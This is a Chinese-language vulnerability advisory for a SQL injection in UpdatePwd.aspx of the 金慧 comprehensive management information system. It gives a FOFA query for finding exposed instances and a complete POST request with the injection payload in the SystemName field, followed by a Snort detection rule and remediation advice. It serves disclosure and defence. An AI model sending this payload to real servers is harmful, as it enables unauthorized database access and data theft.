# 金慧-综合管理信息系统 UpdatePwd.aspx 存在SQL注入漏洞

金慧-综合管理信息系统 UpdatePwd.aspx 存在SQL注入漏洞，攻击者可进行sql注入攻击获取数据库信息或者权限。

# 影响版本

金慧-综合管理信息系统

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：body="/Portal/LoginBegin.aspx" || body="/portal/LoginBegin.aspx"

POC/EXP：第一步

```
POST /Portal/UpdatePwd.aspx?LoginName= HTTP/1.1
Host: 127.0.0.1
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Priority: u=0, i
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUKLTIwNjIxOTEwOWRkBbaTvhv%2ByWbTKSTVx1y6E7qFnAo%3D&__VIEWSTATEGENERATOR=7FC147DC&__EVENTVALIDATION=%2FwEdAAeBOWHyzxoRUImq0lfI2qvAUYglfMtBarbH2LeBEFZ3blwK8%2F1gnn25OldlRNyIedkf1P6GTiFbwnVHMajaCmuzDXCKeN7Biz3dpLrvtu21sFabMRbi%2F2A4oZV6XkcK0do6klUczeYxH4SdGieOR28Q1VJ0AFks4WshtgQDeQmeEVRN5uY%3D&SystemName='+or+1=@@version--&Password=&NewPassword1=&NewPassword2=&ButtonSave=%E7%A1%AE%E5%AE%9A
```

![image-20260130172716602](assets/image-20260130172716602.png)



sonrt规则：

```
alert http any any -> $HOME_NET any (
    msg:"金慧综合管理信息系统 - MSSQL SQL Injection via UpdatePwd.aspx";
    flow:to_server,established;
    http.method; content:"POST";
    http.uri; content:"/Portal/UpdatePwd.aspx";
    http.uri; content:"LoginName=";
    http.request_body; pcre:"/SystemName='%2Bor%2B1%3D@@version--/i";
    metadata:
        service http,
        affected_product "金慧综合管理信息系统",
        vulnerability_type "MSSQL SQL Injection",
        attack_target "database_server",
        severity "high";
    classtype:sql-injection;
    sid:1000595;
    rev:1;
    priority:1;
)
```

# 漏洞修复

关闭互联网暴露面或接口设置访问权限，升级至安全版本。
